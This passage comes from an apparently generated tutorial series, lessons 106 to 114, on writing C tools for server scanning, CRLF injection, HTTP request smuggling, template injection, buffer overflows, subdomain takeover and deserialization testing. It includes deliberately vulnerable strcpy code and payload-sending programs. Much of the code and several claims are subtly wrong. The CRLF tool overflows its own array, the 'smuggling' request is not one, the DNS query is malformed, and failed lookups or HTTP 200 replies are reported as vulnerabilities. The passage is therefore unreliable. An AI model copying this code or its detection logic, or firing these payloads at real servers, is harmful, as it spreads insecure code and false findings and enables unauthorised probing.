+This concludes our one hundred fifth lesson on building a website scanner tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 106: Building a Server-Side Scan Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to perform server-side scanning. Server-side scanning involves analyzing server configurations, installed software, and system vulnerabilities to identify security risks. Our tool will focus on inspecting server headers, checking for known vulnerabilities, and analyzing server responses for potential misconfigurations.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+
+#define MAX_HOST_LENGTH 256
+#define MAX_RESPONSE_SIZE 4096
+
+// Function to resolve hostname to IP address
+int resolve_hostname(const char *hostname, char *ip_address) {
+    struct hostent *he;
+    struct in_addr **addr_list;
+    int i;
+
+    if ((he = gethostbyname(hostname)) == NULL) {
+        herror("gethostbyname");
+        return 0;
+    }
+
+    addr_list = (struct in_addr **)he->h_addr_list;
+
+    for (i = 0; addr_list[i] != NULL; i++) {
+        strcpy(ip_address, inet_ntoa(*addr_list[i]));
+        return 1;
+    }
+
+    return 0;
+}
+
+// Function to send an HTTP request and retrieve the server response
+int send_http_request(const char *ip_address, const char *request) {
+    int sockfd;
+    struct sockaddr_in server_addr;
+    char response[MAX_RESPONSE_SIZE];
+
+    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        perror("socket");
+        return -1;
+    }
+
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(80);
+
+    if (inet_pton(AF_INET, ip_address, &server_addr.sin_addr) <= 0) {
+        perror("inet_pton");
+        return -1;
+    }
+
+    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("connect");
+        return -1;
+    }
+
+    if (send(sockfd, request, strlen(request), 0) < 0) {
+        perror("send");
+        return -1;
+    }
+
+    if (recv(sockfd, response, MAX_RESPONSE_SIZE, 0) < 0) {
+        perror("recv");
+        return -1;
+    }
+
+    printf("Server response:\n%s\n", response);
+
+    close(sockfd);
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <hostname>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    char ip_address[MAX_HOST_LENGTH];
+    if (!resolve_hostname(argv[1], ip_address)) {
+        fprintf(stderr, "Error: Failed to resolve hostname.\n");
+        return EXIT_FAILURE;
+    }
+
+    printf("Target IP address: %s\n", ip_address);
+
+    // Send an HTTP request to the server
+    char request[] = "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n";
+    if (send_http_request(ip_address, request) < 0) {
+        fprintf(stderr, "Error: Failed to send HTTP request.\n");
+        return EXIT_FAILURE;
+    }
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- We use socket programming to send an HTTP request to the target server and retrieve the server response.
+- The `resolve_hostname` function resolves the hostname to an IP address.
+- The `send_http_request` function establishes a TCP connection with the server, sends an HTTP request, and receives the server response.
+- The HTTP request is a simple GET request to the root URL of the server.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Implementation of additional HTTP methods (e.g., POST, PUT) and request headers to perform more comprehensive server-side scanning.
+- Integration with security testing libraries or frameworks (e.g., OWASP ZAP, Nikto) to detect common server-side vulnerabilities, such as outdated software versions or misconfigurations.
+- Support for analyzing server responses and extracting relevant information, such as server headers, HTTP status codes, and response bodies.
+- Implementation of SSL/TLS support to perform secure communication with HTTPS servers.
+
+#### Conclusion:
+
+Building a server-side scan tool in C provides a foundation for analyzing server configurations and identifying potential security risks. By sending HTTP requests, analyzing server responses, and inspecting server headers, administrators and security professionals can assess the security posture of servers and take appropriate remediation actions.
+
+This concludes our one hundred sixth lesson on building a server-side scan tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 107: Building a Carriage Return Line Feed Injection Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to demonstrate Carriage Return Line Feed (CRLF) injection vulnerabilities. CRLF injection occurs when an attacker can insert CRLF characters into an HTTP response, leading to various security issues such as HTTP header injection, response splitting, or session fixation. Our tool will simulate CRLF injection attacks by sending crafted HTTP requests and analyzing the server's response.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+
+#define MAX_HOST_LENGTH 256
+#define MAX_RESPONSE_SIZE 4096
+
+// Function to resolve hostname to IP address
+int resolve_hostname(const char *hostname, char *ip_address) {
+    struct hostent *he;
+    struct in_addr **addr_list;
+    int i;
+
+    if ((he = gethostbyname(hostname)) == NULL) {
+        herror("gethostbyname");
+        return 0;
+    }
+
+    addr_list = (struct in_addr **)he->h_addr_list;
+
+    for (i = 0; addr_list[i] != NULL; i++) {
+        strcpy(ip_address, inet_ntoa(*addr_list[i]));
+        return 1;
+    }
+
+    return 0;
+}
+
+// Function to send an HTTP request and retrieve the server response
+int send_http_request(const char *ip_address, const char *request) {
+    int sockfd;
+    struct sockaddr_in server_addr;
+    char response[MAX_RESPONSE_SIZE];
+
+    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        perror("socket");
+        return -1;
+    }
+
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(80);
+
+    if (inet_pton(AF_INET, ip_address, &server_addr.sin_addr) <= 0) {
+        perror("inet_pton");
+        return -1;
+    }
+
+    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("connect");
+        return -1;
+    }
+
+    if (send(sockfd, request, strlen(request), 0) < 0) {
+        perror("send");
+        return -1;
+    }
+
+    if (recv(sockfd, response, MAX_RESPONSE_SIZE, 0) < 0) {
+        perror("recv");
+        return -1;
+    }
+
+    printf("Server response:\n%s\n", response);
+
+    close(sockfd);
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <hostname>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    char ip_address[MAX_HOST_LENGTH];
+    if (!resolve_hostname(argv[1], ip_address)) {
+        fprintf(stderr, "Error: Failed to resolve hostname.\n");
+        return EXIT_FAILURE;
+    }
+
+    printf("Target IP address: %s\n", ip_address);
+
+    // Crafted HTTP request with CRLF injection
+    char request[] = "GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\nCookie: sessionid=123\r\n\r\n";
+
+    // Inject CRLF characters after the User-Agent header
+    char *crlf_injection = "\r\nInjection: Payload\r\n";
+
+    strcat(request, crlf_injection);
+
+    // Send the crafted HTTP request to the server
+    if (send_http_request(ip_address, request) < 0) {
+        fprintf(stderr, "Error: Failed to send HTTP request.\n");
+        return EXIT_FAILURE;
+    }
+
+    return EXIT_SUCCESS;
+}
+```
+
+#### Explanation:
+
+- We use socket programming to send an HTTP request to the target server and retrieve the server response.
+- The `resolve_hostname` function resolves the hostname to an IP address.
+- The `send_http_request` function establishes a TCP connection with the server, sends an HTTP request, and receives the server response.
+- We craft an HTTP request with CRLF injection by appending CRLF characters after the User-Agent header.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Implementation of additional CRLF injection payloads to demonstrate different attack scenarios, such as HTTP header injection or response splitting.
+- Integration with vulnerability scanners or security testing frameworks to detect and exploit CRLF injection vulnerabilities in web applications automatically.
+- Support for analyzing server responses and extracting relevant information, such as injected headers or modified content.
+
+#### Conclusion:
+
+Building a CRLF injection tool in C provides a framework for demonstrating and testing CRLF injection vulnerabilities in web applications. By crafting HTTP requests with injected CRLF characters and analyzing the server's response, developers and security professionals can identify and mitigate CRLF injection vulnerabilities effectively.
+
+This concludes our one hundred seventh lesson on building a CRLF injection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 108: Building an HTTP Request Smuggling Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to demonstrate HTTP request smuggling vulnerabilities. HTTP request smuggling occurs when inconsistencies in the interpretation of HTTP headers by different components (e.g., web servers, proxies) lead to request manipulation and potential security issues. Our tool will simulate HTTP request smuggling attacks by sending crafted requests and analyzing server behavior.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+
+#define MAX_HOST_LENGTH 256
+#define MAX_RESPONSE_SIZE 4096
+
+// Function to resolve hostname to IP address
+int resolve_hostname(const char *hostname, char *ip_address) {
+    struct hostent *he;
+    struct in_addr **addr_list;
+    int i;
+
+    if ((he = gethostbyname(hostname)) == NULL) {
+        herror("gethostbyname");
+        return 0;
+    }
+
+    addr_list = (struct in_addr **)he->h_addr_list;
+
+    for (i = 0; addr_list[i] != NULL; i++) {
+        strcpy(ip_address, inet_ntoa(*addr_list[i]));
+        return 1;
+    }
+
+    return 0;
+}
+
+// Function to send an HTTP request and retrieve the server response
+int send_http_request(const char *ip_address, const char *request) {
+    int sockfd;
+    struct sockaddr_in server_addr;
+    char response[MAX_RESPONSE_SIZE];
+
+    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        perror("socket");
+        return -1;
+    }
+
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(80);
+
+    if (inet_pton(AF_INET, ip_address, &server_addr.sin_addr) <= 0) {
+        perror("inet_pton");
+        return -1;
+    }
+
+    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("connect");
+        return -1;
+    }
+
+    if (send(sockfd, request, strlen(request), 0) < 0) {
+        perror("send");
+        return -1;
+    }
+
+    if (recv(sockfd, response, MAX_RESPONSE_SIZE, 0) < 0) {
+        perror("recv");
+        return -1;
+    }
+
+    printf("Server response:\n%s\n", response);
+
+    close(sockfd);
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <hostname>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    char ip_address[MAX_HOST_LENGTH];
+    if (!resolve_hostname(argv[1], ip_address)) {
+        fprintf(stderr, "Error: Failed to resolve hostname.\n");
+        return EXIT_FAILURE;
+    }
+
+    printf("Target IP address: %s\n", ip_address);
+
+    // Crafted HTTP request with HTTP request smuggling payload
+    char request[] = "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 7\r\n\r\n0\r\n\r\n";
+
+    // Send the crafted HTTP request to the server
+    if (send_http_request(ip_address, request) < 0) {
+        fprintf(stderr, "Error: Failed to send HTTP request.\n");
+        return EXIT_FAILURE;
+    }
+
+    return EXIT_SUCCESS;
+}
+```
+
+#### Explanation:
+
+- We use socket programming to send an HTTP request to the target server and retrieve the server response.
+- The `resolve_hostname` function resolves the hostname to an IP address.
+- The `send_http_request` function establishes a TCP connection with the server, sends an HTTP request, and receives the server response.
+- We craft an HTTP request with an HTTP request smuggling payload by sending a chunked request with a premature closing of the body.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Implementation of additional HTTP request smuggling payloads to demonstrate different attack scenarios, such as splitting attacks or desynchronization attacks.
+- Integration with vulnerability scanners or security testing frameworks to detect and exploit HTTP request smuggling vulnerabilities in web applications automatically.
+- Support for analyzing server responses and extracting relevant information, such as backend behavior or proxy configurations.
+
+#### Conclusion:
+
+Building an HTTP request smuggling tool in C provides a framework for demonstrating and testing HTTP request smuggling vulnerabilities in web applications. By crafting HTTP requests with malicious payloads and analyzing the server's response, developers and security professionals can identify and mitigate HTTP request smuggling vulnerabilities effectively.
+
+This concludes our one hundred eighth lesson on building an HTTP request smuggling tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 109: Building a Client-Side Template Injection Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to demonstrate Client-Side Template Injection (CSTI) vulnerabilities. CSTI vulnerabilities occur when client-side templates (e.g., Mustache, Handlebars) are rendered with user-controlled input, leading to arbitrary code execution or XSS attacks. Our tool will simulate CSTI attacks by injecting template payloads into web forms and analyzing client-side rendering.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+
+#define MAX_HOST_LENGTH 256
+#define MAX_RESPONSE_SIZE 4096
+
+// Function to resolve hostname to IP address
+int resolve_hostname(const char *hostname, char *ip_address) {
+    struct hostent *he;
+    struct in_addr **addr_list;
+    int i;
+
+    if ((he = gethostbyname(hostname)) == NULL) {
+        herror("gethostbyname");
+        return 0;
+    }
+
+    addr_list = (struct in_addr **)he->h_addr_list;
+
+    for (i = 0; addr_list[i] != NULL; i++) {
+        strcpy(ip_address, inet_ntoa(*addr_list[i]));
+        return 1;
+    }
+
+    return 0;
+}
+
+// Function to send an HTTP request and retrieve the server response
+int send_http_request(const char *ip_address, const char *request) {
+    int sockfd;
+    struct sockaddr_in server_addr;
+    char response[MAX_RESPONSE_SIZE];
+
+    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        perror("socket");
+        return -1;
+    }
+
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(80);
+
+    if (inet_pton(AF_INET, ip_address, &server_addr.sin_addr) <= 0) {
+        perror("inet_pton");
+        return -1;
+    }
+
+    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("connect");
+        return -1;
+    }
+
+    if (send(sockfd, request, strlen(request), 0) < 0) {
+        perror("send");
+        return -1;
+    }
+
+    if (recv(sockfd, response, MAX_RESPONSE_SIZE, 0) < 0) {
+        perror("recv");
+        return -1;
+    }
+
+    printf("Server response:\n%s\n", response);
+
+    close(sockfd);
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <hostname>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    char ip_address[MAX_HOST_LENGTH];
+    if (!resolve_hostname(argv[1], ip_address)) {
+        fprintf(stderr, "Error: Failed to resolve hostname.\n");
+        return EXIT_FAILURE;
+    }
+
+    printf("Target IP address: %s\n", ip_address);
+
+    // Crafted HTTP request with template injection payload
+    char request[] = "POST /submit HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nname={{7*7}}\r\n";
+
+    // Send the crafted HTTP request to the server
+    if (send_http_request(ip_address, request) < 0) {
+        fprintf(stderr, "Error: Failed to send HTTP request.\n");
+        return EXIT_FAILURE;
+    }
+
+    return EXIT_SUCCESS;
+}
+```
+
+#### Explanation:
+
+- We use socket programming to send an HTTP request to the target server and retrieve the server response.
+- The `resolve_hostname` function resolves the hostname to an IP address.
+- The `send_http_request` function establishes a TCP connection with the server, sends an HTTP request, and receives the server response.
+- We craft an HTTP request with a template injection payload by injecting template syntax into the request body.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Implementation of additional template injection payloads to demonstrate different attack scenarios, such as code execution or XSS attacks.
+- Integration with vulnerability scanners or security testing frameworks to detect and exploit client-side template injection vulnerabilities in web applications automatically.
+- Support for analyzing server responses and extracting relevant information, such as rendered templates or injected content.
+
+#### Conclusion:
+
+Building a client-side template injection tool in C provides a framework for demonstrating and testing CSTI vulnerabilities in web applications. By crafting HTTP requests with template payloads and analyzing the server's response, developers and security professionals can identify and mitigate CSTI vulnerabilities effectively.
+
+This concludes our one hundred ninth lesson on building a client-side template injection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 110: Building a Memory Vulnerabilities Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to demonstrate various memory vulnerabilities such as buffer overflows, use-after-free, and format string vulnerabilities. Memory vulnerabilities are critical security issues that can lead to arbitrary code execution, denial of service, or information disclosure. Our tool will simulate memory vulnerability attacks by crafting malicious inputs and analyzing program behavior.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define MAX_BUFFER_SIZE 32
+
+// Vulnerable function with buffer overflow vulnerability
+void vulnerable_function(const char *input) {
+    char buffer[MAX_BUFFER_SIZE];
+    strcpy(buffer, input);
+    printf("Buffer content: %s\n", buffer);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <input>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    // Simulate buffer overflow vulnerability
+    vulnerable_function(argv[1]);
+
+    return EXIT_SUCCESS;
+}
+```
+
+#### Explanation:
+
+- We define a vulnerable function `vulnerable_function` that copies input into a fixed-size buffer using `strcpy`.
+- The `main` function takes user input as a command-line argument and passes it to the vulnerable function.
+- If the input exceeds the size of the buffer, a buffer overflow vulnerability occurs, potentially leading to memory corruption and arbitrary code execution.
+
+#### Further Development:
+
+To make this tool more versatile and cover other memory vulnerabilities, you can enhance it with the following features:
+
+- Implementation of additional vulnerable functions to demonstrate other memory vulnerabilities such as use-after-free or format string vulnerabilities.
+- Integration with static analysis tools or sanitizers (e.g., AddressSanitizer) to detect memory vulnerabilities automatically during program compilation.
+- Support for dynamic analysis techniques such as fuzzing or symbolic execution to identify memory vulnerabilities in complex software systems.
+
+#### Conclusion:
+
+Building a memory vulnerabilities tool in C provides a framework for demonstrating and testing various memory-related security issues. By crafting malicious inputs and analyzing program behavior, developers and security professionals can identify and mitigate memory vulnerabilities effectively.
+
+This concludes our one hundred tenth lesson on building a memory vulnerabilities tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 111: Building a Subdomain Takeover Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to identify potential subdomain takeover vulnerabilities. Subdomain takeover occurs when a subdomain that points to an external service (e.g., AWS S3 bucket) becomes available for registration, allowing an attacker to take control of it and exploit it for malicious purposes. Our tool will scan a list of subdomains and check their DNS records for potential takeover vulnerabilities.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+
+#define MAX_SUBDOMAIN_LENGTH 256
+#define MAX_RESPONSE_SIZE 4096
+
+// Function to resolve hostname to IP address
+int resolve_hostname(const char *hostname, char *ip_address) {
+    struct hostent *he;
+    struct in_addr **addr_list;
+    int i;
+
+    if ((he = gethostbyname(hostname)) == NULL) {
+        herror("gethostbyname");
+        return 0;
+    }
+
+    addr_list = (struct in_addr **)he->h_addr_list;
+
+    for (i = 0; addr_list[i] != NULL; i++) {
+        strcpy(ip_address, inet_ntoa(*addr_list[i]));
+        return 1;
+    }
+
+    return 0;
+}
+
+// Function to send DNS query and retrieve DNS records
+int send_dns_query(const char *subdomain) {
+    struct sockaddr_in server_addr;
+    int sockfd;
+    char query[MAX_SUBDOMAIN_LENGTH];
+    char response[MAX_RESPONSE_SIZE];
+
+    if ((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
+        perror("socket");
+        return -1;
+    }
+
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(53);
+    server_addr.sin_addr.s_addr = inet_addr("8.8.8.8"); // Google Public DNS
+
+    sprintf(query, "%s.%s", subdomain, "example.com");
+
+    if (sendto(sockfd, query, strlen(query), 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("sendto");
+        return -1;
+    }
+
+    socklen_t addr_len = sizeof(server_addr);
+    int recv_len = recvfrom(sockfd, response, MAX_RESPONSE_SIZE, 0, (struct sockaddr *)&server_addr, &addr_len);
+    if (recv_len < 0) {
+        perror("recvfrom");
+        return -1;
+    }
+
+    printf("Response received for %s: %s\n", subdomain, response);
+
+    close(sockfd);
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        fprintf(stderr, "Usage: %s <subdomain1> [<subdomain2> ...]\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    for (int i = 1; i < argc; i++) {
+        char ip_address[MAX_SUBDOMAIN_LENGTH];
+        if (!resolve_hostname(argv[i], ip_address)) {
+            printf("Subdomain %s is available for takeover!\n", argv[i]);
+        } else {
+            printf("Subdomain %s is already resolved to IP address %s\n", argv[i], ip_address);
+            // Send DNS query to check if the subdomain has a CNAME record
+            if (send_dns_query(argv[i]) < 0) {
+                fprintf(stderr, "Error: Failed to send DNS query.\n");
+                return EXIT_FAILURE;
+            }
+        }
+    }
+
+    return EXIT_SUCCESS;
+}
+```
+
+#### Explanation:
+
+- We use socket programming to send DNS queries and retrieve DNS records for subdomains.
+- The `resolve_hostname` function resolves the subdomain to an IP address. If resolution fails, the subdomain is considered available for takeover.
+- The `send_dns_query` function sends a DNS query for the subdomain to check if it has a CNAME record pointing to an external service.
+- The `main` function iterates through the list of subdomains provided as command-line arguments and checks their availability for takeover.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Integration with DNS recon tools or online services to perform comprehensive subdomain enumeration and identify potential takeover candidates automatically.
+- Support for checking additional DNS records (e.g., MX records, TXT records) to gather more information about subdomains and their configurations.
+- Implementation of advanced techniques for detecting subdomain takeover vulnerabilities, such as HTTP response analysis or DNS zone transfer.
+
+#### Conclusion:
+
+Building a subdomain takeover tool in C provides a framework for identifying potential subdomain takeover vulnerabilities and mitigating them proactively. By scanning subdomains and analyzing their DNS records, developers and security professionals can prevent unauthorized access and ensure the integrity of their domain infrastructure.
+
+This concludes our one hundred eleventh lesson on building a subdomain takeover tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 112: Building a Race Condition Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to simulate and detect race condition vulnerabilities. Race conditions occur when the behavior of a program depends on the timing or interleaving of multiple threads or processes. Our tool will create multiple threads to access shared resources concurrently and analyze the program's behavior for potential race conditions.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <pthread.h>
+
+#define NUM_THREADS 4
+#define NUM_ITERATIONS 1000000
+
+int shared_variable = 0;
+
+// Function to simulate a critical section
+void *access_shared_variable(void *thread_id) {
+    int tid = *(int *)thread_id;
+    for (int i = 0; i < NUM_ITERATIONS; i++) {
+        shared_variable++;
+    }
+    printf("Thread %d: Incremented shared variable %d times\n", tid, NUM_ITERATIONS);
+    pthread_exit(NULL);
+}
+
+int main() {
+    pthread_t threads[NUM_THREADS];
+    int thread_ids[NUM_THREADS];
+
+    for (int i = 0; i < NUM_THREADS; i++) {
+        thread_ids[i] = i;
+        int ret = pthread_create(&threads[i], NULL, access_shared_variable, (void *)&thread_ids[i]);
+        if (ret) {
+            fprintf(stderr, "Error: pthread_create() failed with code %d\n", ret);
+            return EXIT_FAILURE;
+        }
+    }
+
+    for (int i = 0; i < NUM_THREADS; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    printf("Final value of shared variable: %d\n", shared_variable);
+
+    return EXIT_SUCCESS;
+}
+```
+
+#### Explanation:
+
+- We create multiple threads using the POSIX Threads library (`pthread`) to simulate concurrent access to a shared variable.
+- Each thread increments the shared variable a fixed number of times within a loop to simulate a critical section.
+- The main function waits for all threads to finish using `pthread_join` and then prints the final value of the shared variable.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Implementation of additional synchronization mechanisms (e.g., mutexes, semaphores) to prevent race conditions and ensure thread safety.
+- Integration with static analysis tools or sanitizers (e.g., ThreadSanitizer) to detect race conditions automatically during program execution.
+- Support for analyzing the behavior of multi-process programs to identify race conditions between different processes.
+
+#### Conclusion:
+
+Building a race condition tool in C provides a framework for simulating and detecting race condition vulnerabilities in multi-threaded programs. By creating multiple threads to access shared resources concurrently and analyzing program behavior, developers and security professionals can identify and mitigate race conditions effectively.
+
+This concludes our one hundred twelfth lesson on building a race condition tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 113: Building an Exposed Debug Endpoints Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to identify exposed debug endpoints in web applications. Exposed debug endpoints can provide sensitive information or debugging capabilities that attackers can exploit to gather intelligence about the application's internal state or architecture. Our tool will scan a list of URLs and check for common debug endpoints such as `/debug`, `/info`, or `/status`.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <curl/curl.h>
+
+#define MAX_URL_LENGTH 256
+#define MAX_RESPONSE_SIZE 4096
+
+// Function to perform HTTP GET request and retrieve server response
+int perform_http_get(const char *url) {
+    CURL *curl;
+    CURLcode res;
+
+    curl = curl_easy_init();
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
+        res = curl_easy_perform(curl);
+        if (res != CURLE_OK) {
+            fprintf(stderr, "Error: curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            curl_easy_cleanup(curl);
+            return -1;
+        }
+        long response_code;
+        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
+        if (response_code == 200) {
+            printf("Debug endpoint found: %s\n", url);
+        }
+        curl_easy_cleanup(curl);
+    }
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        fprintf(stderr, "Usage: %s <url1> [<url2> ...]\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    curl_global_init(CURL_GLOBAL_ALL);
+
+    for (int i = 1; i < argc; i++) {
+        if (strlen(argv[i]) >= MAX_URL_LENGTH) {
+            fprintf(stderr, "Error: URL length exceeds maximum allowed length\n");
+            return EXIT_FAILURE;
+        }
+        if (perform_http_get(argv[i]) < 0) {
+            return EXIT_FAILURE;
+        }
+    }
+
+    curl_global_cleanup();
+
+    return EXIT_SUCCESS;
+}
+```
+
+#### Explanation:
+
+- We use libcurl, a C library for transferring data with URLs, to perform HTTP GET requests and retrieve server responses.
+- The `perform_http_get` function initializes a libcurl easy handle, sets the URL, and performs the HTTP GET request. It checks the response code, and if it's 200 (OK), it prints a message indicating that a debug endpoint was found.
+- The `main` function iterates through the list of URLs provided as command-line arguments and checks each URL for the presence of a debug endpoint.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for additional HTTP methods (e.g., POST, HEAD) to test different endpoints and gather more information about the application.
+- Integration with a larger set of common debug endpoint paths and patterns to increase coverage and improve detection accuracy.
+- Implementation of authentication mechanisms (e.g., Basic Authentication, OAuth) to test authenticated debug endpoints and evaluate their security posture.
+
+#### Conclusion:
+
+Building an exposed debug endpoints tool in C provides a framework for identifying potential security vulnerabilities in web applications. By scanning URLs and checking for common debug endpoints, developers and security professionals can proactively identify and mitigate security risks related to exposed debug functionality.
+
+This concludes our one hundred thirteenth lesson on building an exposed debug endpoints tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 114: Building an Insecure Deserialization Tool in C
+
+In this lesson, we'll develop a command-line tool in C programming to analyze and detect insecure deserialization vulnerabilities in web applications. Insecure deserialization vulnerabilities occur when untrusted data is deserialized in an unsafe manner, leading to potential remote code execution or other security risks. Our tool will send serialized payloads to a target application and analyze the response for signs of vulnerability.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <curl/curl.h>
+
+#define MAX_URL_LENGTH 256
+#define MAX_PAYLOAD_LENGTH 4096
+
+// Function to perform HTTP POST request and retrieve server response
+int perform_http_post(const char *url, const char *payload) {
+    CURL *curl;
+    CURLcode res;
+
+    curl = curl_easy_init();
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(payload));
+        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
+        res = curl_easy_perform(curl);
+        if (res != CURLE_OK) {
+            fprintf(stderr, "Error: curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            curl_easy_cleanup(curl);
+            return -1;
+        }
+        long response_code;
+        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
+        if (response_code == 200) {
+            printf("Insecure deserialization vulnerability found: %s\n", url);
+        }
+        curl_easy_cleanup(curl);
+    }
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 3) {
+        fprintf(stderr, "Usage: %s <url> <payload>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    if (strlen(argv[1]) >= MAX_URL_LENGTH || strlen(argv[2]) >= MAX_PAYLOAD_LENGTH) {
+        fprintf(stderr, "Error: URL or payload length exceeds maximum allowed length\n");
+        return EXIT_FAILURE;
+    }
+
+    curl_global_init(CURL_GLOBAL_ALL);
+
+    if (perform_http_post(argv[1], argv[2]) < 0) {
+        return EXIT_FAILURE;
+    }
+
+    curl_global_cleanup();
+
+    return EXIT_SUCCESS;
+}
+```
+
+#### Explanation:
+
+- We use libcurl, a C library for transferring data with URLs, to perform HTTP POST requests and retrieve server responses.
+- The `perform_http_post` function initializes a libcurl easy handle, sets the URL and payload, and performs the HTTP POST request. It checks the response code, and if it's 200 (OK), it prints a message indicating that an insecure deserialization vulnerability was found.
+- The `main` function takes the URL and payload as command-line arguments and checks the target application for insecure deserialization vulnerabilities.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for sending different types of serialized payloads (e.g., JSON, XML, YAML) to test various deserialization mechanisms and identify vulnerabilities in different parts of the application.
